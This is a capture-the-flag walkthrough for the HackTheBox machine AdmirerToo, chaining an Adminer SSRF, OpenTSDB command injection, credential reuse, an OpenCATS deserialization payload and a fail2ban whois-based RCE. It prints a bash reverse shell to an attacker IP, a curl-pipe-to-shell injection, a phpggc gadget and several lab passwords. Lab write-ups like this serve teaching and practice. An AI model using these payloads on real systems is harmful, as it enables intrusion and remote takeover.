---
Category:
  - B2R
Difficulty: Hard
Platform: HackTheBox
Status: 3. Complete
tags:
  - Adminer
  - Linux
  - OpenCats
  - RCE
  - SSRF
  - authentication-bypass
  - credentials-reuse
  - exploit-chain
  - fail2ban
  - hardcoded-credentials
  - insecure-DB-grants
  - insecure-credentials
  - php-deserialization
  - port-forwarding
  - whois-spoofing
  - OpenTSDB
---
![https://maoutis.github.io/assets/images/Screenshots/AdmirerToo/box-summary.jpg](https://maoutis.github.io/assets/images/Screenshots/AdmirerToo/box-summary.jpg)

# Resolution summary

- Web server enumeration allows to identify **admirer-gallery.htb** and subdomain enumeration allows to identify **db.admirer-gallery.htb**
- **db.admirer-gallery.htb** is vulnerable to **Server Side Request Forgery** (CVE-2021-21311) and allows to scan and retrieve information from internal services, including **OpenTSDB** running on port 4242
- **OpenTSDB 2.4.0** is vulnerable to **Remote Code Execution** (CVE-2020-35476) but PoC does not work as it is, so further enumeration through service API is required to make it work and obtain a shell as opentsdb
- Local enumeration reveals **old MySQL credentials inside a configuration file** that can be **reused** to escalate to jennifer
- Local service enumeration reveals a **local port 8080** that can be **forwarded** remotely using ssh and runs a version of **OpenCats** vulnerable **to PHP Object Injection** (CVE-2021-25294)
- Local enumeration reveals other **MySQL credentials** that can be used to access opencats DB
- Opencat login form cannot be bypassed and admin’s credentials extracted from the user table cannot be cracked, however cats user has **full grants** on cats_dev DB, allowing to **overwrite admin credentials** and login.
- Local enuemration reveals that **fail2ban** is installed on the machine and is vulnerable to **Remote Code Execution** (CVE-2021-32749)
- PHP Code Injection and fail2ban Remote Code Execution can be **chained together** in order to write an arbitrary whois.conf and trick the server into using our machine as whois server. Once contacted, a script can be sent able to trigger the RCE in fail2ban during the sending of the notification emails.

## Improved skills

- Exploit SSRF to enumerate and attack internal servers
- Chain multiple vulnerabilities

## Used tools

- nmap
- gobuster
- Public PoC
- ssh (port forwarding)
- phpggc
- nc

---

# Information Gathering

Scanned all TCP ports:

```bash
$ sudo nmap -p- admirertoo.htb -sS -oN scan/all-tcp-ports.txt -v
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
4242/tcp  filtered vrml-multi-use
16010/tcp filtered unknown
16030/tcp filtered unknown
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/AdmirerToo]
└─$ sudo nmap -p22,80,4242,16010,16030 admirertoo.htb -sT -sV -sC -oN scan/open-tcp-ports.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-23 11:01 EDT
Nmap scan report for admirertoo.htb (10.10.11.137)
Host is up (0.036s latency).

PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp    open     http           Apache httpd 2.4.38 ((Debian))
|_http-title: Admirer
|_http-server-header: Apache/2.4.38 (Debian)
4242/tcp  closed   vrml-multi-use
16010/tcp filtered unknown
16030/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.78 seconds
```

# Enumeration

## Port 80 - HTTP (Apache httpd 2.4.38 ((Debian)))

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182.png)

Enumerated files and directories:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/AdmirerToo]
└─$ gobuster dir -u http://admirertoo.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 25
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admirertoo.htb/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/23 11:07:19 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 365] [--> http://admirertoo.htb/css/]
/js                   (Status: 301) [Size: 364] [--> http://admirertoo.htb/js/] 
/img                  (Status: 301) [Size: 365] [--> http://admirertoo.htb/img/]
/fonts                (Status: 301) [Size: 367] [--> http://admirertoo.htb/fonts/]
/manual               (Status: 301) [Size: 368] [--> http://admirertoo.htb/manual/]
```

Discovered DNS **admirer-gallery.htb**:

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%201.png)

VHOST enumeration:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/AdmirerToo]
└─$ gobuster vhost -u admirer-gallery.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://admirer-gallery.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/04/23 11:18:02 Starting gobuster in VHOST enumeration mode
===============================================================
Found: db.admirer-gallery.htb (Status: 200) [Size: 2569]
```

## db.admirer-gallery.htb (Adminer 4.7.8)

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%202.png)

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%203.png)

Enumerated MySQL version:

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%204.png)

Enumerated user credentials:

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%205.png)

>[!important]
>admirer_ro     *8CE6ACD7FC9ABDE377FF1CE332CE1D790E167086

Found user credentials cached within the login page:

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%206.png)

>[!important]
>admirer_ro     1w4nn4b3adm1r3d2!

# Exploitation

## Adminer 4.7.8 Server Side Request Forgery - CVE-2021-21311

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-21311)

Commit that partially resolved the vulnerability:

[https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351](https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351)

Because SSRF is still present but responses cannot be viewed if not with response code 200, we can force a 301 Redirect in order to read server response.

Python script to accept requests on port 80 and redirect them to an arbitrary host with a 301:

[Python script to accept requests on port 80 and redirect them to an arbitrary host with a 301](https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd)

```bash
$ sudo python3 redirect.py 10099 http://10.10.11.137
```

Connection to the attacker server using Elasticsearch module:

![Used the “unhide” feature from burpsuite](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%207.png)

Used the “unhide” feature from burpsuite

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%208.png)

## OpenTSDB 2.4.0 Remote Code Execution - CVE-2020-35476

Enumerated internal port 4242:

```bash
$ sudo python3 redirect.py 10099 http://10.10.11.137:4242/
```

![OpenTSDB](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%209.png)

OpenTSDB

Enumerated OpenTSDB version:

[/api/version](http://opentsdb.net/docs/build/html/api_http/version.html)

```bash
$ sudo python2 redirect.py --port 10099 http://10.10.11.137:4242/api/version
```

```json
{"short_revision":"14ab3ef","repo":"/home/hobbes/OFFICIAL/build","host":"clhbase","version":"2.4.0","full_revision":"14ab3ef8a865816cf920aa69f2e019b7261a7847","repo_status":"MINT","user":"hobbes","branch":"master","timestamp":"1545014415"}
```

### Known vulnerability for OpenTSDB 2.4.0:

[OpenTSDB - A Distributed, Scalable Monitoring System](http://opentsdb.net/)

[Arbitrary Code Execution in net.opentsdb:opentsdb | CVE-2020-35476 | Snyk](https://security.snyk.io/vuln/SNYK-JAVA-NETOPENTSDB-1041751)

Exploited the SSRF to trigger the RCE on port 4242:

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%2010.png)

```bash
$ python2 redirect.py --port 10098 "http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
serving at port 10098
10.10.11.137 - - [24/Apr/2022 14:43:52] "GET / HTTP/1.0" 301 -
10.10.11.137 - - [24/Apr/2022 14:43:52] "GET / HTTP/1.0" 301 -
```

![No such name for 'metrics': 'sys.cpu.nice’](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%2011.png)

No such name for 'metrics': 'sys.cpu.nice’

Enumerated available metrics trough API:

[OpenTSDB - Get all metrics via http](https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http)

[/api/suggest](http://opentsdb.net/docs/build/html/api_http/suggest.html)

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ python2 redirect.py --port 10099 "http://10.10.11.137:4242/api/suggest?type=metrics"
```

```json
["http.stats.web.hits"]
```

Took the existent PoC and fixed with the available metric:

```python
$ python2 redirect.py --port 10098 'http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system("touch/tmp/poc.txt")]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json'
```

```json
{"plotted":4,"timing":0,"cachehit":"disk","etags":[["host"]],"points":8}
```

Reverse shell:

**rev.sh**

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/10100 0>&1'
```

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.137 - - [24/Apr/2022 10:54:50] "GET / HTTP/1.1" 200 -
10.10.11.137 - - [24/Apr/2022 10:56:33] "GET /rev.sh HTTP/1.1" 200 -
10.10.11.137 - - [24/Apr/2022 10:57:33] "GET /rev.sh HTTP/1.1" 200 -
```

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ python2 redirect.py --port 10099 'http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system("curl${IFS}http://10.10.14.2/rev.sh|/bin/sh")]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json'
serving at port 10099
10.10.11.137 - - [24/Apr/2022 10:56:33] "GET / HTTP/1.0" 301 -
10.10.11.137 - - [24/Apr/2022 10:57:33] "GET / HTTP/1.0" 301 -
```

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ nc -nlvp 10100
listening on [any] 10100 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.137] 43194
bash: cannot set terminal process group (549): Inappropriate ioctl for device
bash: no job control in this shell
opentsdb@admirertoo:/$ id
uid=1000(opentsdb) gid=1000(opentsdb) groups=1000(opentsdb)
```

# Lateral Movement to jennifer

## Local enumeration

Enumerated users:

```bash
opentsdb@admirertoo:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
opentsdb:x:1000:1000::/usr/share/opentsdb:/bin/false
hbase:x:1001:1001::/opt/hbase/:/sbin/nologin
mysql:x:105:114:MySQL Server,,,:/nonexistent:/bin/false
jennifer:x:1002:100::/home/jennifer:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
Debian-exim:x:107:113::/var/spool/exim4:/usr/sbin/nologin
devel:x:1003:1003::/home/devel:/sbin/nologin
```

Enumerated open ports:

```bash
opentsdb@admirertoo:/tmp$ netstat -polentau
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          15337      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      105        16191      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      0          14268      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:39384         127.0.0.1:4242          ESTABLISHED 33         876179     -                    keepalive (5420.82/0/0)
tcp        0    187 10.10.11.137:43194      10.10.14.2:10100        ESTABLISHED 1000       1090591    11229/bash           on (0.23/0/0)
tcp        0      0 127.0.0.1:39380         127.0.0.1:4242          ESTABLISHED 33         876148     -                    keepalive (5420.82/0/0)
tcp        0      0 127.0.0.1:39378         127.0.0.1:4242          ESTABLISHED 33         876635     -                    keepalive (5289.74/0/0)
tcp6       0      0 127.0.1.1:16020         :::*                    LISTEN      1001       18331      -                    off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      0          15339      -                    off (0.00/0/0)
tcp6       0      0 :::16030                :::*                    LISTEN      1001       19459      -                    off (0.00/0/0)
tcp6       0      0 127.0.1.1:16000         :::*                    LISTEN      1001       19448      -                    off (0.00/0/0)
tcp6       0      0 127.0.0.1:2181          :::*                    LISTEN      1001       19416      -                    off (0.00/0/0)
tcp6       0      0 :::16010                :::*                    LISTEN      1001       18326      -                    off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      0          15352      -                    off (0.00/0/0)
tcp6       0      0 :::4242                 :::*                    LISTEN      1000       21278      557/java             off (0.00/0/0)
tcp6       0      0 127.0.0.1:60916         127.0.1.1:16020         TIME_WAIT   0          0          -                    timewait (47.37/0/0)
tcp6       0      0 127.0.0.1:2181          127.0.0.1:45726         ESTABLISHED 1001       18332      -                    off (0.00/0/0)
tcp6       0      0 127.0.0.1:2181          127.0.0.1:45714         ESTABLISHED 1001       18301      -                    off (0.00/0/0)
tcp6       0      0 127.0.0.1:4242          127.0.0.1:39384         ESTABLISHED 1000       876860     557/java             keepalive (5420.82/0/0)
tcp6       0      0 127.0.1.1:16000         127.0.1.1:44267         ESTABLISHED 1001       20913      -                    keepalive (5682.30/0/0)
tcp6       0      0 127.0.0.1:45726         127.0.0.1:2181          ESTABLISHED 1001       19458      -                    off (0.00/0/0)
tcp6       0      0 127.0.0.1:45742         127.0.0.1:2181          ESTABLISHED 1001       20286      -                    off (0.00/0/0)
tcp6       0      0 127.0.0.1:2181          127.0.0.1:45742         ESTABLISHED 1001       20915      -                    off (0.00/0/0)
tcp6       0      0 127.0.0.1:4242          127.0.0.1:39380         ESTABLISHED 1000       876791     557/java             keepalive (5420.82/0/0)
tcp6       0      0 127.0.1.1:44267         127.0.1.1:16000         ESTABLISHED 1001       20909      -                    keepalive (5682.30/0/0)
tcp6       0      0 127.0.0.1:45714         127.0.0.1:2181          ESTABLISHED 1001       18300      -                    off (0.00/0/0)
tcp6       0      0 127.0.0.1:4242          127.0.0.1:39378         ESTABLISHED 1000       876636     557/java             keepalive (5289.74/0/0)
udp        0      0 10.10.11.137:40632      1.1.1.1:53              ESTABLISHED 101        1104895    -                    off (0.00/0/0)
udp        0      0 10.10.11.137:35291      8.8.8.8:53              ESTABLISHED 101        1105921    -                    off (0.00/0/0)
```

Found hardcoded credentials:

```php
opentsdb@admirertoo:~$ grep -ri admirer_ro /var/www/adminer/
/var/www/adminer/plugins/data/servers.php:    'username' => 'admirer_ro',
opentsdb@admirertoo:~$ cat /var/www/adminer/plugins/data/servers.php
<?php
return [
  'localhost' => array(
//    'username' => 'admirer',
//    'pass'     => 'bQ3u7^AxzcB7qAsxE3',
// Read-only account for testing
    'username' => 'admirer_ro',
    'pass'     => '1w4nn4b3adm1r3d2!',
    'label'    => 'MySQL',
    'databases' => array(
      'admirer' => 'Admirer DB',
    )
  ),
];
```

>[!important]
>admirer     bQ3u7^AxzcB7qAsxE3

Log in as jennifer reusing known passwords:

>[!important]
>jennifer     bQ3u7^AxzcB7qAsxE3

```bash
opentsdb@admirertoo:~$ su jennifer
Password: 
jennifer@admirertoo:/usr/share/opentsdb$ id
uid=1002(jennifer) gid=100(users) groups=100(users)
jennifer@admirertoo:/usr/share/opentsdb$ cat ~/user.txt 
c171776485c8d1852be98f88edbba763
```

# Privilege Escalation

## Local Enumeration

### Port 8080 - HTTP

Forwarded port 8080:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/AdmirerToo]
└─$ ssh -L 1337:localhost:8080 jennifer@admirertoo.htb
The authenticity of host 'admirertoo.htb (10.10.11.137)' can't be established.
ED25519 key fingerprint is SHA256:6GHqCefcB0XKD8lrY40SKb5COmsxVdTiXV4NYplmxbY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'admirertoo.htb' (ED25519) to the list of known hosts.
jennifer@admirertoo.htb's password:
Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Feb 22 20:58:38 2022 from 10.10.14.8
jennifer@admirertoo:~$
```

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%2012.png)

Enumerated configuration file for DB credentials:

```bash
jennifer@admirertoo:/opt/opencats$ cat config.php | grep -i database
/* Database configuration. */
define('DATABASE_USER', 'cats');
define('DATABASE_PASS', 'adm1r3r0fc4ts');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'cats_dev');
 * core team. If this setting is enabled, no writing to the database will
/* If enabled, the US zipcode database is installed and the user can filter
```

>[!important]
>cats     adm1r3r0fc4ts

Enumerated DB data:

```bash
jennifer@admirertoo:/opt/opencats$ mysql -u cats -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 134652
Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> ...
MariaDB [cats_dev]> show tables;
+--------------------------------------+
| Tables_in_cats_dev                   |
+--------------------------------------+
| access_level                         |
| activity                             |
| activity_type                        |
...
| tag                                  |
| user                                 |
| user_login                           |
| word_verification                    |
| xml_feed_submits                     |
| xml_feeds                            |
| zipcodes                             |
+--------------------------------------+
55 rows in set (0.001 sec)

MariaDB [cats_dev]> select user_name,password from user;
+----------------+----------------------------------+
| user_name      | password                         |
+----------------+----------------------------------+
| admin          | dfa2a420a4e48de6fe481c90e295fe97 |
| cats@rootadmin | cantlogin                        |
| jennifer       | f59f297aa82171cc860d76c390ce7f3e |
+----------------+----------------------------------+
3 rows in set (0.000 sec)
```

Enumerated user privileges ni MySQL:

```json
MariaDB [cats_dev]> show grants;
+-------------------------------------------------------------------------------------------------------------+
| Grants for cats@localhost                                                                                   |
+-------------------------------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO `cats`@`localhost` IDENTIFIED BY PASSWORD '*6DB7C7C159FC2393785B54064E70FDB137F445B9' |
| GRANT ALL PRIVILEGES ON `cats_dev`.* TO `cats`@`localhost`                                                  |
+-------------------------------------------------------------------------------------------------------------+
2 rows in set (0.000 sec)
```

Updated every password (cracking hashes was not working):

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/AdmirerToo]
└─$ echo -n maoutis | md5sum
6f2ae4978075eae54f9491744818d28d  -
```

```bash
MariaDB [cats_dev]> update user set password="6f2ae4978075eae54f9491744818d28d";
```

Logged in to opencats using self injected credentials:

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%2013.png)

### Enumerated other services

```bash
jennifer@admirertoo:/opt/opencats$ systemctl list-units --type=service
UNIT                               LOAD   ACTIVE SUB     DESCRIPTION
apache2.service                    loaded active running The Apache HTTP Server
apache2@opencats.service           loaded active running The Apache HTTP Server
apparmor.service                   loaded active exited  Load AppArmor profiles
console-setup.service              loaded active exited  Set console font and keymap
cron.service                       loaded active running Regular background program processing daemon
dbus.service                       loaded active running D-Bus System Message Bus
fail2ban.service                   loaded active running Fail2Ban Service
getty@tty1.service                 loaded active running Getty on tty1
hbase.service                      loaded active running HBase
ifup@eth0.service                  loaded active exited  ifup for eth0
ifupdown-pre.service               loaded active exited  Helper to synchronize boot up for ifupdown
keyboard-setup.service             loaded active exited  Set the console keyboard layout
kmod-static-nodes.service          loaded active exited  Create list of required static device nodes for the curren
mariadb.service                    loaded active running MariaDB 10.3.31 database server
networking.service                 loaded active exited  Raise network interfaces
nftables.service                   loaded active exited  nftables
open-vm-tools.service              loaded active running Service for virtual machines hosted on VMware
opentsdb.service                   loaded active running LSB: Starts OpenTSDB TSD
php7.3-fpm.service                 loaded active running The PHP 7.3 FastCGI Process Manager
rsyslog.service                    loaded active running System Logging Service
ssh.service                        loaded active running OpenBSD Secure Shell server
systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage
systemd-journald.service           loaded active running Journal Service
systemd-logind.service             loaded active running Login Service
systemd-modules-load.service       loaded active exited  Load Kernel Modules
systemd-random-seed.service        loaded active exited  Load/Save Random Seed
systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems
systemd-sysctl.service             loaded active exited  Apply Kernel Variables
systemd-sysusers.service           loaded active exited  Create System Users
systemd-timesyncd.service          loaded active running Network Time Synchronization
systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev
systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories
systemd-udev-trigger.service       loaded active exited  udev Coldplug all Devices
systemd-udevd.service              loaded active running udev Kernel Device Manager
systemd-update-utmp.service        loaded active exited  Update UTMP about System Boot/Shutdown
systemd-user-sessions.service      loaded active exited  Permit User Sessions
user-runtime-dir@1002.service      loaded active exited  User Runtime Directory /run/user/1002
user@1002.service                  loaded active running User Manager for UID 1002
vgauth.service                     loaded active running Authentication service for virtual machines hosted on VMwa

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.

39 loaded units listed. Pass --all to see loaded but inactive units, too.
To show all installed unit files use 'systemctl list-unit-files'.
```

Enumerated fail2ban:

```bash
jennifer@admirertoo:/opt/opencats$ fail2ban-server -V
Fail2Ban v0.10.2

jennifer@admirertoo:/opt/opencats$ cat /etc/fail2ban/jail.local
[DEFAULT]
ignoreip = 127.0.0.1
bantime = 60s
destemail = root@admirertoo.htb
sender = fail2ban@admirertoo.htb
sendername = Fail2ban
mta = mail
action = %(action_mwl)s
```

## OpenCATS PHP Object Injection to Arbitrary File Write - CVE-2021-25294

OpenCATS Version 0.9.5.2

[CVE-2021-25294 : OpenCATS through 0.9.5-3 unsafely deserializes index.php?m=activity requests, leading to remote code execution. This occ](https://www.cvedetails.com/cve/CVE-2021-25294/)

[OpenCATS PHP Object Injection to Arbitrary File Write](https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html)

Generated the POP gadget like the PoC does:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ echo 'this is a test' > /tmp/test.txt

┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/test.txt /tmp/test.txt
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A15%3A%22this+is+a+test%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A17%3A%22%2Fdev%2Fshm%2Ftest.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
```

![AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182](../../zzz_res/attachments/AdmirerToo%20240a5f42ba804c368714cbfe2f9e8182%2014.png)

```bash
jennifer@admirertoo:/opt/opencats$ ls -al /dev/shm/test.txt 
-rw-r--r-- 1 devel devel 58 Apr 24 20:19 /dev/shm/test.txt
jennifer@admirertoo:/opt/opencats$ cat /dev/shm/test.txt 
[{"Expires":1,"Discard":false,"Value":"this is a test\n"}]
```

Enumerated devel group writable directories:

```bash
jennifer@admirertoo:~/test$ find / -group devel 2>/dev/null
/opt/opencats/INSTALL_BLOCK
/usr/local/src
/usr/local/etc
jennifer@admirertoo:/tmp$ ls -al /usr/local/src/                                                                                                                                                                                            
total 8                                                                                                                                                                                                                                     
drwxrwxr-x  2 root devel 4096 Jul  7  2021 .                                                                                                                                                                                                
drwxr-xr-x 10 root root  4096 Jul  7  2021 ..
```

## RCE vulnerability in mailing action using mailutils (mail-whois)

[Build software better, together](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm)

>[!quote]
> Command `mail` from mailutils package used in mail actions like `mail-whois` can execute command if unescaped sequences (`\n~`) are available in "foreign" input (for instance in whois output).
[...]
*The '~!' escape executes specified command and returns you to mail compose mode without altering your message. When used without arguments, it starts your login shell. The '~|' escape pipes the message composed so far through the given shell command and replaces the message with the output the command produced. If the command produced no output, mail assumes that something went wrong and retains the old contents of your message.*
[...]
**Which menas that as long as attacker can control stdin that goes to mail (from mailutils package) command - code execution could be achieved. 
Then - the interesting configuration file from fail2ban perspective is `/etc/fail2ban/action.d/mail-whois.conf` fragment:
[...]
This strictly puts whois command output of banned IP address into email. So if attacker could **get control over whois output of his own IP** address - code execution could be achieved (with root, which is more fun of course).
> 

```bash
jennifer@admirertoo:/opt/opencats$ cat /etc/fail2ban/action.d/mail-whois.conf
...
actionban = printf %%b "Hi,\n
            The IP <ip> has just been banned by Fail2Ban after
            <failures> attempts against <name>.\n\n
            Here is more information about <ip> :\n
            `%(_whois_command)s`\n
            Regards,\n
            Fail2Ban"|mail -s "[Fail2Ban] <name>: banned <ip> from <fq-hostname>" <dest>
...
```

